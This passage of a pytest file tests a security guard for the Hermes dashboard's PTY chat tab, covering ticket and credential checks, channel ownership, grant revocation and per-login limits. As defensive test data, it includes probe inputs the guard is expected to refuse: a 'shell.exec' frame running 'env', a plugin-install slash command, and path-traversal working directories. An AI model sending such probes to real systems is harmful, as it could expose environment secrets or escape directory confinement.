        self.key, self.bridge, self.alive, self.attached, self.last_detached_at = key, bridge, True, True, None

    async def close(self):
        self.alive = False
        self.bridge.close()


class StandInRegistry:
    """`pty_session.PtySessionRegistry` as far as the guard and the handler use it."""

    def __init__(self):
        self._sessions = {}
        self._attach_lock = None

    async def attach_or_spawn(self, key, *, spawn):
        existing = self._sessions.get(key)
        if existing is not None and existing.alive:
            existing.attached = True
            return existing, False
        bridge = await asyncio.to_thread(spawn)
        self._sessions[key] = StandInSession(key, bridge)
        return self._sessions[key], True

    def detach(self, key, ws):
        session = self._sessions.get(key)
        if session is not None:
            session.attached = False
            session.last_detached_at = len(self._sessions) + (session.last_detached_at or 0)


def pty_socket_auth(store, chat):
    """`web_server_chat._ws_auth_reason` in miniature, gated: `?internal=` through
    `consume_internal_credential` and `?ticket=` through `consume_ticket` (both looked up at call
    time, as Hermes imports them inside the function), stamping `{user_id, provider}` on the socket
    as `_stamp_identity` does; `?token=` is the loopback token."""

    def _ws_auth_reason(sock):
        q = dict(urllib.parse.parse_qsl(sock.scope.get("query_string", b"").decode("latin-1"), keep_blank_values=True))
        if q.get("internal"):
            try:
                info = store.consume_internal_credential(q["internal"])
            except TicketInvalid:
                return "internal_invalid", "internal"
            sock._hermes_auth_identity = {"user_id": info.get("user_id"), "provider": info.get("provider")}
            return None, "internal"
        if q.get("ticket"):
            try:
                info = store.consume_ticket(q["ticket"])
            except TicketInvalid:
                return "ticket_invalid", "ticket"
            sock._hermes_auth_identity = {"user_id": info.get("user_id"), "provider": info.get("provider")}
            return None, "ticket"
        if q.get("token"):
            return None, "token"
        return "no_credential", "none"

    chat._ws_auth_reason = _ws_auth_reason


def psock(path, peer="127.0.0.1", **query):
    """A socket stand-in with a real query string (lists repeat a name) and a peer."""
    pairs = [(k, v) for k, vs in query.items() for v in (vs if isinstance(vs, list) else [vs])]
    return SimpleNamespace(url=SimpleNamespace(path=path), client=SimpleNamespace(host=peer),
                           scope={"type": "websocket", "path": path,
                                  "query_string": urllib.parse.urlencode(pairs).encode("latin-1")})


class ClosingSocket:
    """A socket the guard may close: records the close."""

    def __init__(self, path, **query):
        self.__dict__.update(vars(psock(path, **query)))
        self.closed_with = None

    async def close(self, code=1000, reason=None):
        self.closed_with = (code, reason)


@pytest.fixture
def chat_tab_free(guard, home):
    """The guard's socket, ticket, gateway and PTY seams on stand-ins, with the session store of
    SESSION_ROWS (the resident is `edgecity:u1`; adm1 is a landing admin's chat)."""
    StandInBridge.spawned = []
    store = pty_ticket_store()
    chat = SimpleNamespace(PtyBridge=StandInBridge, PTY_REGISTRY=StandInRegistry(), PtyUnavailableError=Unavailable,
                           _LOOPBACK_HOSTS=frozenset({"127.0.0.1", "::1", "localhost"}), resolved=[],
                           descendants={})
    pty_socket_auth(store, chat)

    def _server_internal_ws_url(path, **extra):
        return f"ws://127.0.0.1:9119{path}?" + urllib.parse.urlencode({"internal": store.internal_ws_credential(),
                                                                       **extra})

    async def _resolve_chat_argv_async(resume=None, sidecar_url=None, profile=None, active_session_file=None,
                                       workspace_cwd=None):
        chat.resolved.append({"resume": resume, "sidecar_url": sidecar_url, "profile": profile,
                              "workspace_cwd": workspace_cwd})
        env = {"HERMES_HOME": str(home), "STRAY": _server_internal_ws_url("/api/ws"), "HERMES_TUI_IMAGE": "/etc/x.png"}
        scoped = bool((profile or "").strip()) and profile.strip().lower() != "current"
        if scoped:
            env["HERMES_HOME"] = str(home / "profiles" / profile)
        else:
            env["HERMES_TUI_GATEWAY_URL"] = _server_internal_ws_url("/api/ws")
        if resume:
            env["HERMES_TUI_RESUME"] = chat.descendants.get(resume, resume)
        if sidecar_url:
            env["HERMES_TUI_SIDECAR_URL"] = sidecar_url
        if workspace_cwd:
            env["HERMES_CWD"] = env["HERMES_TUI_CWD"] = workspace_cwd
        return ["hermes", "--tui"], None, env

    chat._server_internal_ws_url = _server_internal_ws_url
    chat._resolve_chat_argv_async = _resolve_chat_argv_async
    assert guard.install_tickets(store) is True
    assert guard.install_ws(chat) is True
    server, gateway_ws, _calls = gateway_stand_in()
    guard.set_loader("gateway", lambda: (server, gateway_ws))
    guard.set_session_lookup(session_lookup())
    assert guard.install_pty(chat, store, refusal=Refused, registry_full=Full) is True
    return SimpleNamespace(guard=guard, store=store, chat=chat, home=home, server=server)


def open_pty(t, role="resident", peer="127.0.0.1", attach=None, user=None, **query):
    """What `chat_ws.pty_ws` does, in one task: the gate, then (accepted) the argv resolution with
    the handler's arguments, then the spawn (`attach`: through the registry). Returns
    ("refused", reason) or ("ok", bridge, env, created). `user`: another login than u1/admin-9."""
    if role == "token":
        query["token"] = "tok"
    else:  # a ticket minted inside a request the guard judged `role`; the admin is its own login
        token = t.guard._REQUEST_ROLE.set(role)
        try:
            query["ticket"] = t.store.mint_ticket(user_id=user or ("admin-9" if role == "admin" else "u1"),
                                                  provider="edgecity")
        finally:
            t.guard._REQUEST_ROLE.reset(token)
    sock = psock("/api/pty", peer=peer, **query)

    async def run():
        reason, _cred = t.chat._ws_auth_reason(sock)
        if reason is not None:
            return "refused", reason
        last = dict(urllib.parse.parse_qsl(sock.scope["query_string"].decode("latin-1"), keep_blank_values=True))
        channel = last.get("channel") if re.match(r"^[A-Za-z0-9._-]{1,128}$", last.get("channel", "")) else None
        kwargs = {"resume": last.get("resume") or None, "profile": last.get("profile") or None,
                  "sidecar_url": t.chat._server_internal_ws_url("/api/pub", channel=channel) if channel else None}
        if not kwargs["resume"] and last.get("cwd"):
            kwargs["workspace_cwd"] = last["cwd"]
        argv, cwd, env = await t.chat._resolve_chat_argv_async(**kwargs)
        if attach is None:
            return "ok", t.chat.PtyBridge.spawn(argv, cwd=cwd, env=env), env, True
        session, created = await t.chat.PTY_REGISTRY.attach_or_spawn(
            attach, spawn=lambda: t.chat.PtyBridge.spawn(argv, cwd=cwd, env=env))
        t.chat.PTY_REGISTRY.detach(attach, sock)
        return "ok", session.bridge, env, created

    return asyncio.run(run())


def credential_of(env, name="HERMES_TUI_GATEWAY_URL"):
    return urllib.parse.parse_qs(urllib.parse.urlsplit(env[name]).query)["internal"][0]


def test_without_the_pty_seam_a_residents_chat_tab_is_refused(sockets):
    sock = ws("/api/pty", ticket=mint_as(sockets.guard, sockets.store, "resident"))
    assert sockets.chat._ws_auth_reason(sock) == ("edgecity_admin_only", "ticket")
    assert sockets.guard.installed()["pty"] is False


@pytest.mark.parametrize("query,reason", [
    ({"profile": "work"}, "edgecity_pty_profile"),
    ({"profile": "default"}, "edgecity_pty_profile"),
    ({"profile": ["current", "work"]}, "edgecity_pty_profile"),
    ({"cwd": "/"}, "edgecity_pty_cwd"),
    ({"cwd": "{home}"}, "edgecity_pty_cwd"),
    ({"cwd": "{home}/resident-chat/../plugins"}, "edgecity_pty_cwd"),
    ({"cwd": ["{home}/resident-chat", "/"]}, "edgecity_pty_cwd"),
    ({"resume": "adm1"}, "edgecity_pty_resume"),
    ({"resume": "adm"}, "edgecity_pty_resume"),
    ({"resume": "nope"}, "edgecity_pty_resume"),
    ({"resume": " "}, "edgecity_pty_resume"),
    ({"resume": ["abc123", "adm1"]}, "edgecity_pty_resume"),
])
def test_a_residents_chat_tab_is_refused_before_accept(chat_tab_free, query, reason):
    t = chat_tab_free
    query = {k: ([x.format(home=t.home) for x in v] if isinstance(v, list) else v.format(home=t.home))
             for k, v in query.items()}
    assert open_pty(t, **query) == ("refused", reason)
    assert StandInBridge.spawned == [] and t.guard.pty_grants() == []
    assert t.guard.counts()["denied_" + reason[len("edgecity_"):]] == 1


@pytest.mark.parametrize("query", [{}, {"profile": "current"}, {"profile": ""}, {"profile": " Current "},
                                   {"resume": "abc123"}, {"resume": "tg1"}, {"cwd": "{home}/resident-chat"},
                                   {"channel": "chat-1", "fresh": "1"}])
def test_a_residents_own_chat_tab_opens(chat_tab_free, query):
    t = chat_tab_free
    query = {k: v.format(home=t.home) for k, v in query.items()}
    result = open_pty(t, **query)
    assert result[0] == "ok", result
    assert len(StandInBridge.spawned) == 1 and t.guard.pty_grants()[0].state == "bound"


def test_no_login_no_chat_tab(chat_tab_free):
    """The loopback token carries no login: no Chat tab (a loopback dashboard keeps 1.3.x)."""
    assert open_pty(chat_tab_free, role="token") == ("refused", "edgecity_pty_no_login")


def test_the_residents_child_env(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    _ok, bridge, env, _created = open_pty(t, channel="chat-1")
    chat = os.path.realpath(t.home / "resident-chat")
    (grant,) = g.pty_grants()
    assert credential_of(env) == grant.credential and len(grant.credential) >= 43
    assert urllib.parse.urlsplit(env["HERMES_TUI_GATEWAY_URL"])[:3] == ("ws", "127.0.0.1:9119", "/api/ws")
    assert urllib.parse.parse_qs(urllib.parse.urlsplit(env["HERMES_TUI_SIDECAR_URL"]).query) == {
        "internal": [grant.credential], "channel": ["chat-1"]}
    assert not any("server-cred" in v for v in env.values()) and "STRAY" not in env and "HERMES_TUI_IMAGE" not in env
    assert env["HERMES_CWD"] == env["HERMES_TUI_CWD"] == chat
    assert env["HOME"] == env["HERMES_HOME"] == os.path.join(os.path.realpath(t.home), "resident-tui",
                                                             __import__("hashlib").sha256(b"edgecity:u1").hexdigest()[:32])
    for key, value in g.PTY_FORCED_ENV.items():
        assert env[key] == value, key
    # SEC1-refute4 N-rf4-1: no heap dump (a V8 snapshot holds the env): the dump's mkdir fails.
    assert env["HERMES_HEAPDUMP_DIR"] == g.PTY_NO_HEAPDUMP_DIR
    with pytest.raises(NotADirectoryError):
        os.makedirs(env["HERMES_HEAPDUMP_DIR"], exist_ok=True)
    assert t.chat.resolved[-1] == {"resume": None, "sidecar_url": None, "profile": None, "workspace_cwd": chat}
    assert (grant.login, grant.channel, grant.info()) == ("edgecity:u1", "chat-1", {"user_id": "u1", "provider": "edgecity"})
    assert isinstance(bridge, g.GrantBridge) and bridge.env is env


def test_an_admins_chat_tab_is_hermess_own(chat_tab_free):
    t = chat_tab_free
    _ok, bridge, env, _created = open_pty(t, role="admin", channel="chat-a", profile="work")
    assert credential_of(env, "STRAY") == "server-cred" and "VISUAL" not in env
    assert t.chat.resolved[-1]["profile"] == "work" and t.guard.pty_grants() == []
    assert not isinstance(bridge, t.guard.GrantBridge)


def test_the_grant_is_the_resident_on_its_own_two_sockets_and_nowhere_else(chat_tab_free):
    t = chat_tab_free
    _ok, _bridge, env, _created = open_pty(t, channel="chat-1")
    cred = credential_of(env)
    sock = psock("/api/ws", internal=cred)
    assert t.chat._ws_auth_reason(sock) == (None, "internal")
    assert sock._edgecity_ws_role == "resident" and sock._hermes_auth_identity == {"user_id": "u1", "provider": "edgecity"}
    assert t.chat._ws_auth_reason(psock("/api/pub", internal=cred, channel="chat-1")) == (None, "internal")
    for path, query, reason in (
            ("/api/pub", {"channel": "chat-2"}, "edgecity_pty_channel"),
            ("/api/pub", {}, "edgecity_pty_channel"),
            ("/api/pub", {"channel": ["chat-1", "chat-2"]}, "edgecity_pty_channel"),
            ("/api/console", {}, "edgecity_admin_only"), ("/api/pty", {}, "edgecity_admin_only"),
            ("/api/events", {"channel": "chat-1"}, "edgecity_admin_only")):
        assert t.chat._ws_auth_reason(psock(path, internal=cred, **query)) == (reason, "internal"), (path, query)
    assert t.chat._ws_auth_reason(psock("/api/ws", peer="203.0.113.9", internal=cred)) == ("edgecity_pty_peer", "internal")
    assert t.chat._ws_auth_reason(psock("/api/ws", peer="::ffff:127.0.0.1", internal=cred)) == (None, "internal")
    # Two open sockets per path at most (the TUI's and a reconnect); a closed one frees its slot.
    assert t.chat._ws_auth_reason(psock("/api/ws", internal=cred)) == ("edgecity_pty_sockets", "internal")
    sock._edgecity_closed = True
    assert t.chat._ws_auth_reason(psock("/api/ws", internal=cred)) == (None, "internal")
    # The process-wide credential is still the admin terminal's.
    internal = psock("/api/ws", internal="server-cred")
    assert t.chat._ws_auth_reason(internal) == (None, "internal") and internal._edgecity_ws_role == "internal"


def test_the_grants_gateway_connection_is_judged_a_resident(chat_tab_free):
    """The child's /api/ws is the resident's: off-list methods 4031, another login's chat 4031, its
    own chat served."""
    t = chat_tab_free
    _ok, _bridge, env, _created = open_pty(t)
    sock = psock("/api/ws", internal=credential_of(env))
    assert t.chat._ws_auth_reason(sock)[0] is None
    sock.frames = [rpc("shell.exec", {"command": "env"}), rpc("slash.exec", {"command": "/plugins install x"}),
                   rpc("session.title", {"session_id": "admin-sid", "title": "x"}),
                   rpc("session.title", {"session_id": "own-sid", "title": "x"})]
    frames = asyncio.run(run_gateway(t, sock))
    assert [f.get("error", {}).get("code") for f in frames] == [4031, 4031, 4031, None]


async def run_gateway(t, sock):
    """The socket's frames through the guarded stand-in `handle_ws`."""
    _server, gateway_ws = t.guard._loaders["gateway"]()
    return await gateway_ws.handle_ws(sock)


def test_closing_the_pty_revokes_the_grant_and_closes_its_open_sockets(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    _ok, bridge, env, _created = open_pty(t, channel="chat-1")
    cred = credential_of(env)

    async def run():
        ws_sock, pub_sock = ClosingSocket("/api/ws", internal=cred), ClosingSocket("/api/pub", internal=cred,
                                                                                    channel="chat-1")
        assert t.chat._ws_auth_reason(ws_sock) == (None, "internal")
        assert t.chat._ws_auth_reason(pub_sock) == (None, "internal")
        await asyncio.to_thread(bridge.close)
        await asyncio.sleep(0.05)
        return ws_sock, pub_sock

    ws_sock, pub_sock = asyncio.run(run())
    assert bridge.closed and ws_sock.closed_with == pub_sock.closed_with == (4401, "auth: edgecity_pty_revoked")
    assert g.pty_grants() == []
    assert t.chat._ws_auth_reason(psock("/api/ws", internal=cred)) == ("internal_invalid", "internal")
    assert g.counts()["pty_revoked_closed"] == 1


def test_the_childs_exit_revokes_the_grant(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    _ok, bridge, env, _created = open_pty(t)
    assert bridge.read() == b"" and g.pty_grants()
    bridge._edgecity_inner.exited = True
    assert bridge.read() is None and g.pty_grants() == []
    assert t.chat._ws_auth_reason(psock("/api/ws", internal=credential_of(env)))[0] == "internal_invalid"


def test_a_frame_on_a_revoked_grants_connection_is_refused(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    _ok, bridge, env, _created = open_pty(t)
    sock = psock("/api/ws", internal=credential_of(env))
    assert t.chat._ws_auth_reason(sock)[0] is None
    bridge.close()
    sock.frames = [rpc("session.title", {"session_id": "own-sid", "title": "x"})]
    (frame,) = asyncio.run(run_gateway(t, sock))
    assert frame["error"]["code"] == 4031 and g.counts()["denied_pty_revoked"] == 1


def test_the_chat_hermes_settles_on_is_checked_again_before_spawn(chat_tab_free):
    """The handler's own resume (the channel's active-session file, Hermes's newest descendant) and
    a profile-scoped env: refused after accept, before anything spawns."""
    t, g = chat_tab_free, chat_tab_free.guard
    t.chat.descendants["abc123"] = "adm1"  # an owned chat whose newest continuation is the admin's
    with pytest.raises(Refused, match="not yours"):
        open_pty(t, resume="abc123")
    sock_query = {"ticket": mint_as(g, t.store, "resident")}

    async def handler_resumes(resume):
        sock = psock("/api/pty", **sock_query)
        assert t.chat._ws_auth_reason(sock) == (None, "ticket")
        return await t.chat._resolve_chat_argv_async(resume=resume, sidecar_url=None, profile=None)

    with pytest.raises(Refused, match="not yours"):
        asyncio.run(handler_resumes("adm1"))  # what an active-session file named
    sock_query["ticket"] = mint_as(g, t.store, "resident")

    async def scoped():
        sock = psock("/api/pty", **sock_query)
        assert t.chat._ws_auth_reason(sock) == (None, "ticket")
        return await t.chat._resolve_chat_argv_async(resume=None, sidecar_url=None, profile="work")

    with pytest.raises(Refused, match="admin only"):
        asyncio.run(scoped())
    assert StandInBridge.spawned == [] and g.pty_grants() == []
    assert g.counts()["denied_pty_resume"] == 2 and g.counts()["denied_pty_profile"] == 1


def test_without_a_pty_context_nothing_resolves_for_anyone_but_an_admin(chat_tab_free):
    t = chat_tab_free
    with pytest.raises(Refused):
        asyncio.run(t.chat._resolve_chat_argv_async(resume=None, sidecar_url=None, profile=None))
    assert t.guard.counts()["denied_pty_no_context"] == 1
    # Hermes's own spawn for anything that is not a resident's Chat tab.
    assert not isinstance(t.chat.PtyBridge.spawn(["x"], env={}), t.guard.GrantBridge)


def test_no_attach_url_no_chat(chat_tab_free, monkeypatch):
    """Without the attach URL the TUI would spawn a gateway of its own: refused, the grant dropped."""
    t, g = chat_tab_free, chat_tab_free.guard
    monkeypatch.setattr(g, "_pty_url_builder", lambda path, **q: None)
    with pytest.raises(Refused):
        open_pty(t)
    monkeypatch.setattr(g, "_pty_url_builder", lambda path, **q: f"ws://127.0.0.1:9119{path}?token=legacy")
    with pytest.raises(Refused):
        open_pty(t)
    assert StandInBridge.spawned == [] and g.pty_grants() == [] and g.counts()["denied_pty_attach_url"] == 2


def test_a_spawn_that_fails_or_a_reattach_drops_the_unused_grant(chat_tab_free, monkeypatch):
    t, g = chat_tab_free, chat_tab_free.guard
    assert open_pty(t, attach="T1")[3] is True
    (first,) = g.pty_grants()
    _ok, bridge, _env, created = open_pty(t, attach="T1")
    assert created is False and bridge._edgecity_grant is first and g.pty_grants() == [first]

    def broken(argv, *, cwd=None, env=None):
        raise OSError("no pty")

    monkeypatch.setattr(StandInBridge, "spawn", staticmethod(broken))
    with pytest.raises(OSError):
        open_pty(t)
    assert g.pty_grants() == [first] and g.counts()["pty_revoked_spawn_failed"] == 1


def test_attach_tokens_are_per_login(chat_tab_free):
    t = chat_tab_free
    _ok, admin_bridge, _env, _created = open_pty(t, role="admin", attach="TOK")
    _ok, own_bridge, _env, created = open_pty(t, attach="TOK")
    assert created is True and own_bridge._edgecity_inner is not admin_bridge
    keys = sorted(t.chat.PTY_REGISTRY._sessions)
    assert keys[0] == "TOK" and keys[1].startswith("edgecity-resident:") and keys[1].endswith("\0TOK")


def test_a_login_holds_at_most_its_limit_making_room_from_its_own_detached_terminals(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    registry = t.chat.PTY_REGISTRY
    open_pty(t, role="admin", attach="ADM")
    for tok in ("A", "B", "C"):
        assert open_pty(t, attach=tok)[0] == "ok"
    assert len(g.pty_grants()) == g.RESIDENT_PTYS_PER_LOGIN
    # All three detached: a fourth closes the oldest of the resident's own, never the admin's.
    assert open_pty(t, attach="D")[3] is True
    alive = sorted(k.rsplit("\0", 1)[-1] for k, s in registry._sessions.items() if s.alive)
    assert alive == ["ADM", "B", "C", "D"] and g.counts()["pty_resident_evicted"] == 1
    # All attached: the next is refused.
    for session in registry._sessions.values():
        session.attached = True
    with pytest.raises(Full):
        open_pty(t, attach="E")
    assert g.counts()["denied_pty_limit"] == 1
    # The legacy path (no attach token) meets the same limit at spawn.
    with pytest.raises(Unavailable):
        open_pty(t)
    assert len([gr for gr in g.pty_grants() if gr.login == "edgecity:u1"]) == g.RESIDENT_PTYS_PER_LOGIN


def test_another_logins_channel_is_refused(chat_tab_free):
    t = chat_tab_free
    assert open_pty(t, role="admin", channel="chat-a")[0] == "ok"
    assert open_pty(t, channel="chat-a") == ("refused", "edgecity_pty_channel")
    assert open_pty(t, channel=["chat-a", "chat-r"]) == ("refused", "edgecity_pty_channel")
    assert open_pty(t, channel="chat-r")[0] == "ok"
    assert open_pty(t, channel="chat-r")[0] == "ok"  # its own again
    assert open_pty(t, role="admin", channel="chat-r")[0] == "ok"  # an admin opens anything


def test_a_closed_tab_releases_its_channel_so_one_login_never_fills_the_table(chat_tab_free):
    """SEC1-refute4 S-rf4-1: the table was box-wide and never released, so open-and-close tabs (or
    wear: a new channel per Chat mount) filled it and every resident's next tab was refused. A
    resident's entry now goes with the channel's last live credential."""
    t, g = chat_tab_free, chat_tab_free.guard
    for i in range(g.PTY_CHANNELS_PER_LOGIN + 8):
        result = open_pty(t, channel=f"chat-{i}")
        assert result[0] == "ok", (i, result)
        assert g._pty_channels == {f"chat-{i}": "edgecity:u1"}
        result[1].close()  # the tab closed: Hermes closes the bridge, the credential is revoked
        assert g._pty_channels == {} and g.pty_grants() == []
    assert g.counts()["pty_channel_released"] == g.PTY_CHANNELS_PER_LOGIN + 8
    for user in ("u1", "u2"):
        assert open_pty(t, user=user, channel=f"chat-new-{user}")[0] == "ok"
    assert open_pty(t, role="admin", channel="chat-new-adm")[0] == "ok"
    # The child's exit releases it too; a second live tab on the same channel keeps it.
    _ok, first, _env, _created = open_pty(t, channel="chat-shared")
    _ok, second, _env, _created = open_pty(t, channel="chat-shared")
    first._edgecity_inner.exited = True
    assert first.read() is None and g._pty_channels.get("chat-shared") == "edgecity:u1"
    second.close()
    assert "chat-shared" not in g._pty_channels


def test_a_login_at_its_own_channel_bound_is_refused_with_its_own_code_and_no_one_else_is(chat_tab_free, monkeypatch):
    t, g = chat_tab_free, chat_tab_free.guard
    monkeypatch.setattr(g, "PTY_CHANNELS_PER_LOGIN", 2)
    assert open_pty(t, channel="chat-1")[0] == "ok" and open_pty(t, channel="chat-2")[0] == "ok"
    assert open_pty(t, channel="chat-3") == ("refused", "edgecity_pty_channels")
    assert g.counts()["denied_pty_channels"] == 1
    assert open_pty(t, channel="chat-1")[0] == "ok"  # its own channel again
    # Another resident and an admin are untouched by u1's bound; an admin is never refused.
    assert open_pty(t, user="u2", channel="chat-b1")[0] == "ok"
    for i in range(3):
        assert open_pty(t, role="admin", channel=f"chat-adm-{i}")[0] == "ok"
    held = sorted(c for c, owner in g._pty_channels.items() if owner == "edgecity:admin-9")
    assert held == ["chat-adm-1", "chat-adm-2"]  # the admin's own oldest made room
    assert sorted(c for c, owner in g._pty_channels.items() if owner == "edgecity:u1") == ["chat-1", "chat-2"]


def test_the_channel_is_recorded_only_when_the_spawn_is_committed(chat_tab_free, monkeypatch):
    """Admission records nothing; a tab refused after it (its settled chat, its directory, its
    limit) holds no entry; and the commit checks the channel again, so two logins admitted on one
    new channel do not both run on it."""
    t, g = chat_tab_free, chat_tab_free.guard
    t.chat.descendants["abc123"] = "adm1"  # Hermes settles u1's own chat on an admin's continuation
    with pytest.raises(Refused):
        open_pty(t, channel="chat-w", resume="abc123")
    assert g._pty_channels == {} and g.pty_grants() == []
    with monkeypatch.context() as m:
        m.setattr(g, "resident_tui_dir", lambda login: None)
        with pytest.raises(Refused):
            open_pty(t, channel="chat-x")
    assert g._pty_channels == {}
    for i in range(g.RESIDENT_PTYS_PER_LOGIN):
        assert open_pty(t, channel=f"chat-{i}")[0] == "ok"
    with pytest.raises(Unavailable):
        open_pty(t, channel="chat-over")
    assert "chat-over" not in g._pty_channels and g.counts()["denied_pty_limit"] == 1

    # u2 is admitted on a new channel; before its spawn, an admin's tab starts running on it.
    token = g._REQUEST_ROLE.set("resident")
    try:
        sock = psock("/api/pty", channel="chat-race", ticket=t.store.mint_ticket(user_id="u2", provider="edgecity"))
    finally:
        g._REQUEST_ROLE.reset(token)

    async def race():
        assert t.chat._ws_auth_reason(sock) == (None, "ticket")
        assert g._pty_channels.get("chat-race") is None
        assert (await asyncio.to_thread(open_pty, t, role="admin", channel="chat-race"))[0] == "ok"
        sidecar = t.chat._server_internal_ws_url("/api/pub", channel="chat-race")
        argv, cwd, env = await t.chat._resolve_chat_argv_async(resume=None, profile=None, sidecar_url=sidecar)
        return t.chat.PtyBridge.spawn(argv, cwd=cwd, env=env)

    with pytest.raises(Unavailable):
        asyncio.run(race())
    assert g._pty_channels["chat-race"] == "edgecity:admin-9" and g.counts()["denied_pty_channel"] == 1
    assert not [gr for gr in g.pty_grants() if gr.login == "edgecity:u2"]


def test_stale_unbound_grants_are_dropped(chat_tab_free, monkeypatch):
    t, g = chat_tab_free, chat_tab_free.guard
    ctx = g.PtyContext("resident", "edgecity:u1", {"user_id": "u1", "provider": "edgecity"})
    old = g.mint_grant(ctx)
    monkeypatch.setattr(old, "minted_at", old.minted_at - g.PTY_UNBOUND_SECONDS - 1)
    fresh = g.mint_grant(ctx)
    assert g.pty_grants() == [fresh] and old.state == "revoked"
    with pytest.raises(TicketInvalid):  # minted but never spawned: opens nothing
        t.store.consume_internal_credential(fresh.credential)


def test_the_pty_seams_are_all_or_none_and_one_layer(chat_tab_free):
    t, g = chat_tab_free, chat_tab_free.guard
    for name in ("_resolve_chat_argv_async", "PtyBridge", "PTY_REGISTRY", "_server_internal_ws_url",
                 "PtyUnavailableError"):
        partial = SimpleNamespace(**{k: v for k, v in vars(t.chat).items() if k != name})
        copy = load_copy(g, f"edgecity_test_resident_guard_pty_{name}")
        assert copy.install_pty(partial, t.store) is False and copy.installed()["pty"] is False, name
    resolve, bridge = t.chat._resolve_chat_argv_async, t.chat.PtyBridge
    attach, consume = t.chat.PTY_REGISTRY.attach_or_spawn, t.store.consume_internal_credential
    copy = load_copy(g, "edgecity_test_resident_guard_pty_again")
    assert copy.install_pty(t.chat, t.store) is True
    assert t.chat._resolve_chat_argv_async._edgecity_original is resolve._edgecity_original
    assert t.chat.PtyBridge._edgecity_original is bridge._edgecity_original is StandInBridge
    assert t.chat.PTY_REGISTRY.attach_or_spawn._edgecity_original is attach._edgecity_original
    assert t.store.consume_internal_credential._edgecity_original is consume._edgecity_original


# ==================================================================================================
# Against the real Hermes gate, tickets, sockets, gateway and app (skipped without hermes_cli)
# ==================================================================================================

TENANT = "tenant-sec1"
PINNED_VERSION = "0.21.5"


class Ctx:
    """`PluginContext.register_dashboard_auth_provider` as v2026.9.24 behaves in the launch scope."""

    def __init__(self):
        from hermes_cli.dashboard_auth.registry import register_global_provider

        self._register = register_global_provider
        self.registered = []

    def register_dashboard_auth_provider(self, provider):
        self._register(provider)
        self.registered.append(provider.name)


@pytest.fixture(scope="session")
def web_dist(tmp_path_factory):
    """A built-SPA stand-in: Hermes's `_serve_index` injects its bootstrap into this file."""
    dist = tmp_path_factory.mktemp("web_dist")
    (dist / "index.html").write_text(
        '<!doctype html><html><head><title>Hermes</title></head><body><div id="root"></div></body></html>',
        encoding="utf-8")
    (dist / "assets").mkdir()
    (dist / "assets" / "index-test.js").write_text("console.log(1)", encoding="utf-8")
    return dist


@pytest.fixture(scope="session")
def web_server(web_dist, tmp_path_factory):
    """`hermes_cli.web_server` imported with the stand-in dist (WEB_DIST is read at import), and the
    TUI gateway imported as `start_server` imports it."""
    pytest.importorskip("hermes_cli.dashboard_auth")
    pytest.importorskip("fastapi")
    pytest.importorskip("httpx")
    import sys

    import hermes_cli

    # pytest's importlib mode puts a stand-in `plugins` package (this repo's plugins/) in
    # sys.modules, which hides Hermes's own top-level `plugins` package (`plugins.memory`, imported
    # by web_server). Hermes's `plugins/__init__.py` is empty, so adding its directory is enough.
    hermes_plugins = str(Path(hermes_cli.__file__).resolve().parents[1] / "plugins")
    stand_in = sys.modules.get("plugins")
    if stand_in is not None and hermes_plugins not in list(getattr(stand_in, "__path__", [])):
        try:
            stand_in.__path__.append(hermes_plugins)
        except AttributeError:
            stand_in.__path__ = [*stand_in.__path__, hermes_plugins]
    saved = {k: os.environ.get(k) for k in ("HERMES_WEB_DIST", "HERMES_HOME")}
    os.environ["HERMES_WEB_DIST"] = str(web_dist)
    os.environ["HERMES_HOME"] = str(tmp_path_factory.mktemp("hermes_import_home"))
    try:
        from hermes_cli import web_server as module
        from tui_gateway import server as _tui_server, ws as _tui_ws  # noqa: F401
    finally:
        for key, value in saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
    return module


def _unwrapped(value):
    """The Hermes original under any guard wrapper an earlier test's plugin load left behind."""
    for _ in range(8):
        if not getattr(value, "_edgecity_resident_guard", False):
            return value
        value = value._edgecity_original
    return value


@pytest.fixture
def hermes(load_plugin, web_server, tmp_path, monkeypatch):
    if hermes_version() != PINNED_VERSION:
        # The seams, the route and method sets are those of the fleet's Hermes; another checkout on
        # the path (another lane's tests put ~/.hermes/hermes-agent there) is not what we ship to.
        pytest.skip(f"the Hermes-backed half pins Hermes {PINNED_VERSION}; this is {hermes_version()}")
    plugin = load_plugin()
    from hermes_cli import plugins_cmd, plugins_cmd_catalog, web_server_chat
    from hermes_cli.dashboard_auth import middleware, registry, token_auth, ws_tickets
    from hermes_cli.web_routers import dashboard_ui, files
    from tui_gateway import server as tui_server, ws as tui_ws
    from agent import context_references, file_safety

    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("TENANT_ID", TENANT)
    monkeypatch.setenv("CONTROL_PLANE_URL", "http://127.0.0.1:9")
    monkeypatch.setattr(plugin, "_post_json", lambda *args: (200, {"ok": True}))
    # Every seam the guard touches, restored after the test.
    for module, name in ((middleware, "gated_auth_middleware"), (token_auth, "token_auth_middleware"),
                         (ws_tickets, "mint_ticket"), (ws_tickets, "consume_ticket"),
                         (web_server_chat, "_ws_auth_reason"), (tui_server, "dispatch"), (tui_ws, "handle_ws"),
                         (files, "_SENSITIVE_MANAGED_DIR_NAMES"), (web_server, "_DASHBOARD_EMBEDDED_CHAT_ENABLED"),
                         (file_safety, "_READ_DENIED_DIRS"), (context_references, "_ensure_reference_path_allowed"),
                         (ws_tickets, "consume_internal_credential"), (web_server_chat, "_resolve_chat_argv_async"),
                         (web_server_chat, "PtyBridge"), (web_server_chat.PTY_REGISTRY, "attach_or_spawn"),
                         (web_server_chat.PTY_REGISTRY, "detach")):
        monkeypatch.setattr(module, name, _unwrapped(getattr(module, name)))
    monkeypatch.setattr(web_server.app.state, "auth_required", True, raising=False)
    # Route bodies an admin reaches: stubbed, so nothing is cloned, installed or rescanned.
    calls = []
    monkeypatch.setattr(web_server, "_get_dashboard_plugins", lambda force_rescan=False: calls.append(("scan", force_rescan)) or [])
    monkeypatch.setattr(dashboard_ui, "_merged_plugins_hub", lambda: {"stub": "hub"})
    monkeypatch.setattr(plugins_cmd, "_discover_all_plugins", lambda: [])
    monkeypatch.setattr(plugins_cmd_catalog, "installed_catalog_state", lambda installed: {"stub": "catalog"})
